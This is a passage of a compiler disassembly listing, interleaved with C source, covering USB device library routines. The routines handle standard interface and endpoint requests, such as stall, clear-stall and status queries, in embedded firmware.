    case USB_REQ_TYPE_STANDARD:
      switch (pdev->dev_state)
 800b6b2:	687b      	ldr	r3, [r7, #4]
 800b6b4:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b6b8:	b2db      	uxtb	r3, r3
 800b6ba:	3b01      	subs	r3, #1
 800b6bc:	2b02      	cmp	r3, #2
 800b6be:	d840      	bhi.n	800b742 <USBD_StdItfReq+0xb6>
      {
        case USBD_STATE_DEFAULT:
        case USBD_STATE_ADDRESSED:
        case USBD_STATE_CONFIGURED:

          if (LOBYTE(req->wIndex) <= USBD_MAX_NUM_INTERFACES)
 800b6c0:	683b      	ldr	r3, [r7, #0]
 800b6c2:	889b      	ldrh	r3, [r3, #4]
 800b6c4:	b2db      	uxtb	r3, r3
 800b6c6:	2b01      	cmp	r3, #1
 800b6c8:	d836      	bhi.n	800b738 <USBD_StdItfReq+0xac>
          {
            /* Get the class index relative to this interface */
            idx = USBD_CoreFindIF(pdev, LOBYTE(req->wIndex));
 800b6ca:	683b      	ldr	r3, [r7, #0]
 800b6cc:	889b      	ldrh	r3, [r3, #4]
 800b6ce:	b2db      	uxtb	r3, r3
 800b6d0:	4619      	mov	r1, r3
 800b6d2:	6878      	ldr	r0, [r7, #4]
 800b6d4:	f7ff fed8 	bl	800b488 <USBD_CoreFindIF>
 800b6d8:	4603      	mov	r3, r0
 800b6da:	73bb      	strb	r3, [r7, #14]
            if (((uint8_t)idx != 0xFFU) && (idx < USBD_MAX_SUPPORTED_CLASS))
 800b6dc:	7bbb      	ldrb	r3, [r7, #14]
 800b6de:	2bff      	cmp	r3, #255	; 0xff
 800b6e0:	d01d      	beq.n	800b71e <USBD_StdItfReq+0x92>
 800b6e2:	7bbb      	ldrb	r3, [r7, #14]
 800b6e4:	2b00      	cmp	r3, #0
 800b6e6:	d11a      	bne.n	800b71e <USBD_StdItfReq+0x92>
            {
              /* Call the class data out function to manage the request */
              if (pdev->pClass[idx]->Setup != NULL)
 800b6e8:	7bba      	ldrb	r2, [r7, #14]
 800b6ea:	687b      	ldr	r3, [r7, #4]
 800b6ec:	32ae      	adds	r2, #174	; 0xae
 800b6ee:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b6f2:	689b      	ldr	r3, [r3, #8]
 800b6f4:	2b00      	cmp	r3, #0
 800b6f6:	d00f      	beq.n	800b718 <USBD_StdItfReq+0x8c>
              {
                pdev->classId = idx;
 800b6f8:	7bba      	ldrb	r2, [r7, #14]
 800b6fa:	687b      	ldr	r3, [r7, #4]
 800b6fc:	f8c3 22d4 	str.w	r2, [r3, #724]	; 0x2d4
                ret = (USBD_StatusTypeDef)(pdev->pClass[idx]->Setup(pdev, req));
 800b700:	7bba      	ldrb	r2, [r7, #14]
 800b702:	687b      	ldr	r3, [r7, #4]
 800b704:	32ae      	adds	r2, #174	; 0xae
 800b706:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b70a:	689b      	ldr	r3, [r3, #8]
 800b70c:	6839      	ldr	r1, [r7, #0]
 800b70e:	6878      	ldr	r0, [r7, #4]
 800b710:	4798      	blx	r3
 800b712:	4603      	mov	r3, r0
 800b714:	73fb      	strb	r3, [r7, #15]
              if (pdev->pClass[idx]->Setup != NULL)
 800b716:	e004      	b.n	800b722 <USBD_StdItfReq+0x96>
              }
              else
              {
                /* should never reach this condition */
                ret = USBD_FAIL;
 800b718:	2303      	movs	r3, #3
 800b71a:	73fb      	strb	r3, [r7, #15]
              if (pdev->pClass[idx]->Setup != NULL)
 800b71c:	e001      	b.n	800b722 <USBD_StdItfReq+0x96>
              }
            }
            else
            {
              /* No relative interface found */
              ret = USBD_FAIL;
 800b71e:	2303      	movs	r3, #3
 800b720:	73fb      	strb	r3, [r7, #15]
            }

            if ((req->wLength == 0U) && (ret == USBD_OK))
 800b722:	683b      	ldr	r3, [r7, #0]
 800b724:	88db      	ldrh	r3, [r3, #6]
 800b726:	2b00      	cmp	r3, #0
 800b728:	d110      	bne.n	800b74c <USBD_StdItfReq+0xc0>
 800b72a:	7bfb      	ldrb	r3, [r7, #15]
 800b72c:	2b00      	cmp	r3, #0
 800b72e:	d10d      	bne.n	800b74c <USBD_StdItfReq+0xc0>
            {
              (void)USBD_CtlSendStatus(pdev);
 800b730:	6878      	ldr	r0, [r7, #4]
 800b732:	f000 fdf1 	bl	800c318 <USBD_CtlSendStatus>
          }
          else
          {
            USBD_CtlError(pdev, req);
          }
          break;
 800b736:	e009      	b.n	800b74c <USBD_StdItfReq+0xc0>
            USBD_CtlError(pdev, req);
 800b738:	6839      	ldr	r1, [r7, #0]
 800b73a:	6878      	ldr	r0, [r7, #4]
 800b73c:	f000 fd21 	bl	800c182 <USBD_CtlError>
          break;
 800b740:	e004      	b.n	800b74c <USBD_StdItfReq+0xc0>

        default:
          USBD_CtlError(pdev, req);
 800b742:	6839      	ldr	r1, [r7, #0]
 800b744:	6878      	ldr	r0, [r7, #4]
 800b746:	f000 fd1c 	bl	800c182 <USBD_CtlError>
          break;
 800b74a:	e000      	b.n	800b74e <USBD_StdItfReq+0xc2>
          break;
 800b74c:	bf00      	nop
      }
      break;
 800b74e:	e004      	b.n	800b75a <USBD_StdItfReq+0xce>

    default:
      USBD_CtlError(pdev, req);
 800b750:	6839      	ldr	r1, [r7, #0]
 800b752:	6878      	ldr	r0, [r7, #4]
 800b754:	f000 fd15 	bl	800c182 <USBD_CtlError>
      break;
 800b758:	bf00      	nop
  }

  return ret;
 800b75a:	7bfb      	ldrb	r3, [r7, #15]
}
 800b75c:	4618      	mov	r0, r3
 800b75e:	3710      	adds	r7, #16
 800b760:	46bd      	mov	sp, r7
 800b762:	bd80      	pop	{r7, pc}

0800b764 <USBD_StdEPReq>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
USBD_StatusTypeDef USBD_StdEPReq(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800b764:	b580      	push	{r7, lr}
 800b766:	b084      	sub	sp, #16
 800b768:	af00      	add	r7, sp, #0
 800b76a:	6078      	str	r0, [r7, #4]
 800b76c:	6039      	str	r1, [r7, #0]
  USBD_EndpointTypeDef *pep;
  uint8_t ep_addr;
  uint8_t idx;
  USBD_StatusTypeDef ret = USBD_OK;
 800b76e:	2300      	movs	r3, #0
 800b770:	73fb      	strb	r3, [r7, #15]

  ep_addr = LOBYTE(req->wIndex);
 800b772:	683b      	ldr	r3, [r7, #0]
 800b774:	889b      	ldrh	r3, [r3, #4]
 800b776:	73bb      	strb	r3, [r7, #14]

  switch (req->bmRequest & USB_REQ_TYPE_MASK)
 800b778:	683b      	ldr	r3, [r7, #0]
 800b77a:	781b      	ldrb	r3, [r3, #0]
 800b77c:	f003 0360 	and.w	r3, r3, #96	; 0x60
 800b780:	2b40      	cmp	r3, #64	; 0x40
 800b782:	d007      	beq.n	800b794 <USBD_StdEPReq+0x30>
 800b784:	2b40      	cmp	r3, #64	; 0x40
 800b786:	f200 817f 	bhi.w	800ba88 <USBD_StdEPReq+0x324>
 800b78a:	2b00      	cmp	r3, #0
 800b78c:	d02a      	beq.n	800b7e4 <USBD_StdEPReq+0x80>
 800b78e:	2b20      	cmp	r3, #32
 800b790:	f040 817a 	bne.w	800ba88 <USBD_StdEPReq+0x324>
  {
    case USB_REQ_TYPE_CLASS:
    case USB_REQ_TYPE_VENDOR:
      /* Get the class index relative to this endpoint */
      idx = USBD_CoreFindEP(pdev, ep_addr);
 800b794:	7bbb      	ldrb	r3, [r7, #14]
 800b796:	4619      	mov	r1, r3
 800b798:	6878      	ldr	r0, [r7, #4]
 800b79a:	f7ff fe82 	bl	800b4a2 <USBD_CoreFindEP>
 800b79e:	4603      	mov	r3, r0
 800b7a0:	737b      	strb	r3, [r7, #13]
      if (((uint8_t)idx != 0xFFU) && (idx < USBD_MAX_SUPPORTED_CLASS))
 800b7a2:	7b7b      	ldrb	r3, [r7, #13]
 800b7a4:	2bff      	cmp	r3, #255	; 0xff
 800b7a6:	f000 8174 	beq.w	800ba92 <USBD_StdEPReq+0x32e>
 800b7aa:	7b7b      	ldrb	r3, [r7, #13]
 800b7ac:	2b00      	cmp	r3, #0
 800b7ae:	f040 8170 	bne.w	800ba92 <USBD_StdEPReq+0x32e>
      {
        pdev->classId = idx;
 800b7b2:	7b7a      	ldrb	r2, [r7, #13]
 800b7b4:	687b      	ldr	r3, [r7, #4]
 800b7b6:	f8c3 22d4 	str.w	r2, [r3, #724]	; 0x2d4
        /* Call the class data out function to manage the request */
        if (pdev->pClass[idx]->Setup != NULL)
 800b7ba:	7b7a      	ldrb	r2, [r7, #13]
 800b7bc:	687b      	ldr	r3, [r7, #4]
 800b7be:	32ae      	adds	r2, #174	; 0xae
 800b7c0:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b7c4:	689b      	ldr	r3, [r3, #8]
 800b7c6:	2b00      	cmp	r3, #0
 800b7c8:	f000 8163 	beq.w	800ba92 <USBD_StdEPReq+0x32e>
        {
          ret = (USBD_StatusTypeDef)pdev->pClass[idx]->Setup(pdev, req);
 800b7cc:	7b7a      	ldrb	r2, [r7, #13]
 800b7ce:	687b      	ldr	r3, [r7, #4]
 800b7d0:	32ae      	adds	r2, #174	; 0xae
 800b7d2:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b7d6:	689b      	ldr	r3, [r3, #8]
 800b7d8:	6839      	ldr	r1, [r7, #0]
 800b7da:	6878      	ldr	r0, [r7, #4]
 800b7dc:	4798      	blx	r3
 800b7de:	4603      	mov	r3, r0
 800b7e0:	73fb      	strb	r3, [r7, #15]
        }
      }
      break;
 800b7e2:	e156      	b.n	800ba92 <USBD_StdEPReq+0x32e>

    case USB_REQ_TYPE_STANDARD:
      switch (req->bRequest)
 800b7e4:	683b      	ldr	r3, [r7, #0]
 800b7e6:	785b      	ldrb	r3, [r3, #1]
 800b7e8:	2b03      	cmp	r3, #3
 800b7ea:	d008      	beq.n	800b7fe <USBD_StdEPReq+0x9a>
 800b7ec:	2b03      	cmp	r3, #3
 800b7ee:	f300 8145 	bgt.w	800ba7c <USBD_StdEPReq+0x318>
 800b7f2:	2b00      	cmp	r3, #0
 800b7f4:	f000 809b 	beq.w	800b92e <USBD_StdEPReq+0x1ca>
 800b7f8:	2b01      	cmp	r3, #1
 800b7fa:	d03c      	beq.n	800b876 <USBD_StdEPReq+0x112>
 800b7fc:	e13e      	b.n	800ba7c <USBD_StdEPReq+0x318>
      {
        case USB_REQ_SET_FEATURE:
          switch (pdev->dev_state)
 800b7fe:	687b      	ldr	r3, [r7, #4]
 800b800:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b804:	b2db      	uxtb	r3, r3
 800b806:	2b02      	cmp	r3, #2
 800b808:	d002      	beq.n	800b810 <USBD_StdEPReq+0xac>
 800b80a:	2b03      	cmp	r3, #3
 800b80c:	d016      	beq.n	800b83c <USBD_StdEPReq+0xd8>
 800b80e:	e02c      	b.n	800b86a <USBD_StdEPReq+0x106>
          {
            case USBD_STATE_ADDRESSED:
              if ((ep_addr != 0x00U) && (ep_addr != 0x80U))
 800b810:	7bbb      	ldrb	r3, [r7, #14]
 800b812:	2b00      	cmp	r3, #0
 800b814:	d00d      	beq.n	800b832 <USBD_StdEPReq+0xce>
 800b816:	7bbb      	ldrb	r3, [r7, #14]
 800b818:	2b80      	cmp	r3, #128	; 0x80
 800b81a:	d00a      	beq.n	800b832 <USBD_StdEPReq+0xce>
              {
                (void)USBD_LL_StallEP(pdev, ep_addr);
 800b81c:	7bbb      	ldrb	r3, [r7, #14]
 800b81e:	4619      	mov	r1, r3
 800b820:	6878      	ldr	r0, [r7, #4]
 800b822:	f001 fa21 	bl	800cc68 <USBD_LL_StallEP>
                (void)USBD_LL_StallEP(pdev, 0x80U);
 800b826:	2180      	movs	r1, #128	; 0x80
 800b828:	6878      	ldr	r0, [r7, #4]
 800b82a:	f001 fa1d 	bl	800cc68 <USBD_LL_StallEP>
 800b82e:	bf00      	nop
              }
              else
              {
                USBD_CtlError(pdev, req);
              }
              break;
 800b830:	e020      	b.n	800b874 <USBD_StdEPReq+0x110>
                USBD_CtlError(pdev, req);
 800b832:	6839      	ldr	r1, [r7, #0]
 800b834:	6878      	ldr	r0, [r7, #4]
 800b836:	f000 fca4 	bl	800c182 <USBD_CtlError>
              break;
 800b83a:	e01b      	b.n	800b874 <USBD_StdEPReq+0x110>

            case USBD_STATE_CONFIGURED:
              if (req->wValue == USB_FEATURE_EP_HALT)
 800b83c:	683b      	ldr	r3, [r7, #0]
 800b83e:	885b      	ldrh	r3, [r3, #2]
 800b840:	2b00      	cmp	r3, #0
 800b842:	d10e      	bne.n	800b862 <USBD_StdEPReq+0xfe>
              {
                if ((ep_addr != 0x00U) && (ep_addr != 0x80U) && (req->wLength == 0x00U))
 800b844:	7bbb      	ldrb	r3, [r7, #14]
 800b846:	2b00      	cmp	r3, #0
 800b848:	d00b      	beq.n	800b862 <USBD_StdEPReq+0xfe>
 800b84a:	7bbb      	ldrb	r3, [r7, #14]
 800b84c:	2b80      	cmp	r3, #128	; 0x80
 800b84e:	d008      	beq.n	800b862 <USBD_StdEPReq+0xfe>
 800b850:	683b      	ldr	r3, [r7, #0]
 800b852:	88db      	ldrh	r3, [r3, #6]
 800b854:	2b00      	cmp	r3, #0
 800b856:	d104      	bne.n	800b862 <USBD_StdEPReq+0xfe>
                {
                  (void)USBD_LL_StallEP(pdev, ep_addr);
 800b858:	7bbb      	ldrb	r3, [r7, #14]
 800b85a:	4619      	mov	r1, r3
 800b85c:	6878      	ldr	r0, [r7, #4]
 800b85e:	f001 fa03 	bl	800cc68 <USBD_LL_StallEP>
                }
              }
              (void)USBD_CtlSendStatus(pdev);
 800b862:	6878      	ldr	r0, [r7, #4]
 800b864:	f000 fd58 	bl	800c318 <USBD_CtlSendStatus>

              break;
 800b868:	e004      	b.n	800b874 <USBD_StdEPReq+0x110>

            default:
              USBD_CtlError(pdev, req);
 800b86a:	6839      	ldr	r1, [r7, #0]
 800b86c:	6878      	ldr	r0, [r7, #4]
 800b86e:	f000 fc88 	bl	800c182 <USBD_CtlError>
              break;
 800b872:	bf00      	nop
          }
          break;
 800b874:	e107      	b.n	800ba86 <USBD_StdEPReq+0x322>

        case USB_REQ_CLEAR_FEATURE:

          switch (pdev->dev_state)
 800b876:	687b      	ldr	r3, [r7, #4]
 800b878:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b87c:	b2db      	uxtb	r3, r3
 800b87e:	2b02      	cmp	r3, #2
 800b880:	d002      	beq.n	800b888 <USBD_StdEPReq+0x124>
 800b882:	2b03      	cmp	r3, #3
 800b884:	d016      	beq.n	800b8b4 <USBD_StdEPReq+0x150>
 800b886:	e04b      	b.n	800b920 <USBD_StdEPReq+0x1bc>
          {
            case USBD_STATE_ADDRESSED:
              if ((ep_addr != 0x00U) && (ep_addr != 0x80U))
 800b888:	7bbb      	ldrb	r3, [r7, #14]
 800b88a:	2b00      	cmp	r3, #0
 800b88c:	d00d      	beq.n	800b8aa <USBD_StdEPReq+0x146>
 800b88e:	7bbb      	ldrb	r3, [r7, #14]
 800b890:	2b80      	cmp	r3, #128	; 0x80
 800b892:	d00a      	beq.n	800b8aa <USBD_StdEPReq+0x146>
              {
                (void)USBD_LL_StallEP(pdev, ep_addr);
 800b894:	7bbb      	ldrb	r3, [r7, #14]
 800b896:	4619      	mov	r1, r3
 800b898:	6878      	ldr	r0, [r7, #4]
 800b89a:	f001 f9e5 	bl	800cc68 <USBD_LL_StallEP>
                (void)USBD_LL_StallEP(pdev, 0x80U);
 800b89e:	2180      	movs	r1, #128	; 0x80
 800b8a0:	6878      	ldr	r0, [r7, #4]
 800b8a2:	f001 f9e1 	bl	800cc68 <USBD_LL_StallEP>
 800b8a6:	bf00      	nop
              }
              else
              {
                USBD_CtlError(pdev, req);
              }
              break;
 800b8a8:	e040      	b.n	800b92c <USBD_StdEPReq+0x1c8>
                USBD_CtlError(pdev, req);
 800b8aa:	6839      	ldr	r1, [r7, #0]
 800b8ac:	6878      	ldr	r0, [r7, #4]
 800b8ae:	f000 fc68 	bl	800c182 <USBD_CtlError>
              break;
 800b8b2:	e03b      	b.n	800b92c <USBD_StdEPReq+0x1c8>

            case USBD_STATE_CONFIGURED:
              if (req->wValue == USB_FEATURE_EP_HALT)
 800b8b4:	683b      	ldr	r3, [r7, #0]
 800b8b6:	885b      	ldrh	r3, [r3, #2]
 800b8b8:	2b00      	cmp	r3, #0
 800b8ba:	d136      	bne.n	800b92a <USBD_StdEPReq+0x1c6>
              {
                if ((ep_addr & 0x7FU) != 0x00U)
 800b8bc:	7bbb      	ldrb	r3, [r7, #14]
 800b8be:	f003 037f 	and.w	r3, r3, #127	; 0x7f
 800b8c2:	2b00      	cmp	r3, #0
 800b8c4:	d004      	beq.n	800b8d0 <USBD_StdEPReq+0x16c>
                {
                  (void)USBD_LL_ClearStallEP(pdev, ep_addr);
 800b8c6:	7bbb      	ldrb	r3, [r7, #14]
 800b8c8:	4619      	mov	r1, r3
 800b8ca:	6878      	ldr	r0, [r7, #4]
 800b8cc:	f001 fa02 	bl	800ccd4 <USBD_LL_ClearStallEP>
                }
                (void)USBD_CtlSendStatus(pdev);
 800b8d0:	6878      	ldr	r0, [r7, #4]
 800b8d2:	f000 fd21 	bl	800c318 <USBD_CtlSendStatus>

                /* Get the class index relative to this interface */
                idx = USBD_CoreFindEP(pdev, ep_addr);
 800b8d6:	7bbb      	ldrb	r3, [r7, #14]
 800b8d8:	4619      	mov	r1, r3
 800b8da:	6878      	ldr	r0, [r7, #4]
 800b8dc:	f7ff fde1 	bl	800b4a2 <USBD_CoreFindEP>
 800b8e0:	4603      	mov	r3, r0
 800b8e2:	737b      	strb	r3, [r7, #13]
                if (((uint8_t)idx != 0xFFU) && (idx < USBD_MAX_SUPPORTED_CLASS))
 800b8e4:	7b7b      	ldrb	r3, [r7, #13]
 800b8e6:	2bff      	cmp	r3, #255	; 0xff
 800b8e8:	d01f      	beq.n	800b92a <USBD_StdEPReq+0x1c6>
 800b8ea:	7b7b      	ldrb	r3, [r7, #13]
 800b8ec:	2b00      	cmp	r3, #0
 800b8ee:	d11c      	bne.n	800b92a <USBD_StdEPReq+0x1c6>
                {
                  pdev->classId = idx;
 800b8f0:	7b7a      	ldrb	r2, [r7, #13]
 800b8f2:	687b      	ldr	r3, [r7, #4]
 800b8f4:	f8c3 22d4 	str.w	r2, [r3, #724]	; 0x2d4
                  /* Call the class data out function to manage the request */
                  if (pdev->pClass[idx]->Setup != NULL)
 800b8f8:	7b7a      	ldrb	r2, [r7, #13]
 800b8fa:	687b      	ldr	r3, [r7, #4]
 800b8fc:	32ae      	adds	r2, #174	; 0xae
 800b8fe:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b902:	689b      	ldr	r3, [r3, #8]
 800b904:	2b00      	cmp	r3, #0
 800b906:	d010      	beq.n	800b92a <USBD_StdEPReq+0x1c6>
                  {
                    ret = (USBD_StatusTypeDef)(pdev->pClass[idx]->Setup(pdev, req));
 800b908:	7b7a      	ldrb	r2, [r7, #13]
 800b90a:	687b      	ldr	r3, [r7, #4]
 800b90c:	32ae      	adds	r2, #174	; 0xae
 800b90e:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b912:	689b      	ldr	r3, [r3, #8]
 800b914:	6839      	ldr	r1, [r7, #0]
 800b916:	6878      	ldr	r0, [r7, #4]
 800b918:	4798      	blx	r3
 800b91a:	4603      	mov	r3, r0
 800b91c:	73fb      	strb	r3, [r7, #15]
                  }
                }
              }
              break;
 800b91e:	e004      	b.n	800b92a <USBD_StdEPReq+0x1c6>

            default:
              USBD_CtlError(pdev, req);
 800b920:	6839      	ldr	r1, [r7, #0]
 800b922:	6878      	ldr	r0, [r7, #4]
 800b924:	f000 fc2d 	bl	800c182 <USBD_CtlError>
              break;
 800b928:	e000      	b.n	800b92c <USBD_StdEPReq+0x1c8>
              break;
 800b92a:	bf00      	nop
          }
          break;
 800b92c:	e0ab      	b.n	800ba86 <USBD_StdEPReq+0x322>

        case USB_REQ_GET_STATUS:
          switch (pdev->dev_state)
 800b92e:	687b      	ldr	r3, [r7, #4]
 800b930:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b934:	b2db      	uxtb	r3, r3
 800b936:	2b02      	cmp	r3, #2
 800b938:	d002      	beq.n	800b940 <USBD_StdEPReq+0x1dc>
 800b93a:	2b03      	cmp	r3, #3
 800b93c:	d032      	beq.n	800b9a4 <USBD_StdEPReq+0x240>
 800b93e:	e097      	b.n	800ba70 <USBD_StdEPReq+0x30c>
          {
            case USBD_STATE_ADDRESSED:
              if ((ep_addr != 0x00U) && (ep_addr != 0x80U))
 800b940:	7bbb      	ldrb	r3, [r7, #14]
 800b942:	2b00      	cmp	r3, #0
 800b944:	d007      	beq.n	800b956 <USBD_StdEPReq+0x1f2>
 800b946:	7bbb      	ldrb	r3, [r7, #14]
 800b948:	2b80      	cmp	r3, #128	; 0x80
 800b94a:	d004      	beq.n	800b956 <USBD_StdEPReq+0x1f2>
              {
                USBD_CtlError(pdev, req);
 800b94c:	6839      	ldr	r1, [r7, #0]
 800b94e:	6878      	ldr	r0, [r7, #4]
 800b950:	f000 fc17 	bl	800c182 <USBD_CtlError>
                break;
 800b954:	e091      	b.n	800ba7a <USBD_StdEPReq+0x316>
              }
              pep = ((ep_addr & 0x80U) == 0x80U) ? &pdev->ep_in[ep_addr & 0x7FU] : \
 800b956:	f997 300e 	ldrsb.w	r3, [r7, #14]
 800b95a:	2b00      	cmp	r3, #0
 800b95c:	da0b      	bge.n	800b976 <USBD_StdEPReq+0x212>
 800b95e:	7bbb      	ldrb	r3, [r7, #14]
 800b960:	f003 027f 	and.w	r2, r3, #127	; 0x7f
 800b964:	4613      	mov	r3, r2
 800b966:	009b      	lsls	r3, r3, #2
 800b968:	4413      	add	r3, r2
 800b96a:	009b      	lsls	r3, r3, #2
 800b96c:	3310      	adds	r3, #16
 800b96e:	687a      	ldr	r2, [r7, #4]
 800b970:	4413      	add	r3, r2
 800b972:	3304      	adds	r3, #4
 800b974:	e00b      	b.n	800b98e <USBD_StdEPReq+0x22a>
                    &pdev->ep_out[ep_addr & 0x7FU];
 800b976:	7bbb      	ldrb	r3, [r7, #14]
 800b978:	f003 027f 	and.w	r2, r3, #127	; 0x7f
              pep = ((ep_addr & 0x80U) == 0x80U) ? &pdev->ep_in[ep_addr & 0x7FU] : \
 800b97c:	4613      	mov	r3, r2
 800b97e:	009b      	lsls	r3, r3, #2
 800b980:	4413      	add	r3, r2
 800b982:	009b      	lsls	r3, r3, #2
 800b984:	f503 73a8 	add.w	r3, r3, #336	; 0x150
 800b988:	687a      	ldr	r2, [r7, #4]
 800b98a:	4413      	add	r3, r2
 800b98c:	3304      	adds	r3, #4
 800b98e:	60bb      	str	r3, [r7, #8]

              pep->status = 0x0000U;
 800b990:	68bb      	ldr	r3, [r7, #8]
 800b992:	2200      	movs	r2, #0
 800b994:	601a      	str	r2, [r3, #0]

              (void)USBD_CtlSendData(pdev, (uint8_t *)&pep->status, 2U);
 800b996:	68bb      	ldr	r3, [r7, #8]
 800b998:	2202      	movs	r2, #2
 800b99a:	4619      	mov	r1, r3
 800b99c:	6878      	ldr	r0, [r7, #4]
 800b99e:	f000 fc61 	bl	800c264 <USBD_CtlSendData>
              break;
 800b9a2:	e06a      	b.n	800ba7a <USBD_StdEPReq+0x316>

            case USBD_STATE_CONFIGURED:
              if ((ep_addr & 0x80U) == 0x80U)
 800b9a4:	f997 300e 	ldrsb.w	r3, [r7, #14]
 800b9a8:	2b00      	cmp	r3, #0
 800b9aa:	da11      	bge.n	800b9d0 <USBD_StdEPReq+0x26c>
              {
                if (pdev->ep_in[ep_addr & 0xFU].is_used == 0U)
 800b9ac:	7bbb      	ldrb	r3, [r7, #14]
 800b9ae:	f003 020f 	and.w	r2, r3, #15
 800b9b2:	6879      	ldr	r1, [r7, #4]
 800b9b4:	4613      	mov	r3, r2
 800b9b6:	009b      	lsls	r3, r3, #2
 800b9b8:	4413      	add	r3, r2
 800b9ba:	009b      	lsls	r3, r3, #2
 800b9bc:	440b      	add	r3, r1
 800b9be:	3324      	adds	r3, #36	; 0x24
 800b9c0:	881b      	ldrh	r3, [r3, #0]
 800b9c2:	2b00      	cmp	r3, #0
 800b9c4:	d117      	bne.n	800b9f6 <USBD_StdEPReq+0x292>
                {
                  USBD_CtlError(pdev, req);
 800b9c6:	6839      	ldr	r1, [r7, #0]
 800b9c8:	6878      	ldr	r0, [r7, #4]
 800b9ca:	f000 fbda 	bl	800c182 <USBD_CtlError>
                  break;
 800b9ce:	e054      	b.n	800ba7a <USBD_StdEPReq+0x316>
                }
              }
              else
              {
                if (pdev->ep_out[ep_addr & 0xFU].is_used == 0U)
 800b9d0:	7bbb      	ldrb	r3, [r7, #14]
 800b9d2:	f003 020f 	and.w	r2, r3, #15
 800b9d6:	6879      	ldr	r1, [r7, #4]
 800b9d8:	4613      	mov	r3, r2
 800b9da:	009b      	lsls	r3, r3, #2
 800b9dc:	4413      	add	r3, r2
 800b9de:	009b      	lsls	r3, r3, #2
 800b9e0:	440b      	add	r3, r1
 800b9e2:	f503 73b2 	add.w	r3, r3, #356	; 0x164
 800b9e6:	881b      	ldrh	r3, [r3, #0]
 800b9e8:	2b00      	cmp	r3, #0
 800b9ea:	d104      	bne.n	800b9f6 <USBD_StdEPReq+0x292>
                {
                  USBD_CtlError(pdev, req);
 800b9ec:	6839      	ldr	r1, [r7, #0]
 800b9ee:	6878      	ldr	r0, [r7, #4]
 800b9f0:	f000 fbc7 	bl	800c182 <USBD_CtlError>
                  break;
 800b9f4:	e041      	b.n	800ba7a <USBD_StdEPReq+0x316>
                }
              }

              pep = ((ep_addr & 0x80U) == 0x80U) ? &pdev->ep_in[ep_addr & 0x7FU] : \
 800b9f6:	f997 300e 	ldrsb.w	r3, [r7, #14]
 800b9fa:	2b00      	cmp	r3, #0
 800b9fc:	da0b      	bge.n	800ba16 <USBD_StdEPReq+0x2b2>
 800b9fe:	7bbb      	ldrb	r3, [r7, #14]
 800ba00:	f003 027f 	and.w	r2, r3, #127	; 0x7f
 800ba04:	4613      	mov	r3, r2
 800ba06:	009b      	lsls	r3, r3, #2
 800ba08:	4413      	add	r3, r2
 800ba0a:	009b      	lsls	r3, r3, #2
 800ba0c:	3310      	adds	r3, #16
 800ba0e:	687a      	ldr	r2, [r7, #4]
 800ba10:	4413      	add	r3, r2
 800ba12:	3304      	adds	r3, #4
 800ba14:	e00b      	b.n	800ba2e <USBD_StdEPReq+0x2ca>
                    &pdev->ep_out[ep_addr & 0x7FU];
 800ba16:	7bbb      	ldrb	r3, [r7, #14]
 800ba18:	f003 027f 	and.w	r2, r3, #127	; 0x7f
              pep = ((ep_addr & 0x80U) == 0x80U) ? &pdev->ep_in[ep_addr & 0x7FU] : \
 800ba1c:	4613      	mov	r3, r2
 800ba1e:	009b      	lsls	r3, r3, #2
 800ba20:	4413      	add	r3, r2
 800ba22:	009b      	lsls	r3, r3, #2
 800ba24:	f503 73a8 	add.w	r3, r3, #336	; 0x150
 800ba28:	687a      	ldr	r2, [r7, #4]
 800ba2a:	4413      	add	r3, r2
 800ba2c:	3304      	adds	r3, #4
 800ba2e:	60bb      	str	r3, [r7, #8]

              if ((ep_addr == 0x00U) || (ep_addr == 0x80U))
 800ba30:	7bbb      	ldrb	r3, [r7, #14]
 800ba32:	2b00      	cmp	r3, #0
 800ba34:	d002      	beq.n	800ba3c <USBD_StdEPReq+0x2d8>
 800ba36:	7bbb      	ldrb	r3, [r7, #14]
 800ba38:	2b80      	cmp	r3, #128	; 0x80
 800ba3a:	d103      	bne.n	800ba44 <USBD_StdEPReq+0x2e0>
              {
                pep->status = 0x0000U;
 800ba3c:	68bb      	ldr	r3, [r7, #8]
 800ba3e:	2200      	movs	r2, #0
 800ba40:	601a      	str	r2, [r3, #0]
 800ba42:	e00e      	b.n	800ba62 <USBD_StdEPReq+0x2fe>
              }
              else if (USBD_LL_IsStallEP(pdev, ep_addr) != 0U)
 800ba44:	7bbb      	ldrb	r3, [r7, #14]
 800ba46:	4619      	mov	r1, r3
 800ba48:	6878      	ldr	r0, [r7, #4]
 800ba4a:	f001 f979 	bl	800cd40 <USBD_LL_IsStallEP>
 800ba4e:	4603      	mov	r3, r0
 800ba50:	2b00      	cmp	r3, #0
 800ba52:	d003      	beq.n	800ba5c <USBD_StdEPReq+0x2f8>
              {
                pep->status = 0x0001U;
 800ba54:	68bb      	ldr	r3, [r7, #8]
 800ba56:	2201      	movs	r2, #1
 800ba58:	601a      	str	r2, [r3, #0]
 800ba5a:	e002      	b.n	800ba62 <USBD_StdEPReq+0x2fe>
              }
              else
              {
                pep->status = 0x0000U;
 800ba5c:	68bb      	ldr	r3, [r7, #8]
 800ba5e:	2200      	movs	r2, #0
 800ba60:	601a      	str	r2, [r3, #0]
              }

              (void)USBD_CtlSendData(pdev, (uint8_t *)&pep->status, 2U);
 800ba62:	68bb      	ldr	r3, [r7, #8]
 800ba64:	2202      	movs	r2, #2
 800ba66:	4619      	mov	r1, r3
 800ba68:	6878      	ldr	r0, [r7, #4]
 800ba6a:	f000 fbfb 	bl	800c264 <USBD_CtlSendData>
              break;
 800ba6e:	e004      	b.n	800ba7a <USBD_StdEPReq+0x316>

            default:
              USBD_CtlError(pdev, req);
 800ba70:	6839      	ldr	r1, [r7, #0]
 800ba72:	6878      	ldr	r0, [r7, #4]
 800ba74:	f000 fb85 	bl	800c182 <USBD_CtlError>
              break;
 800ba78:	bf00      	nop
          }
          break;
 800ba7a:	e004      	b.n	800ba86 <USBD_StdEPReq+0x322>

        default:
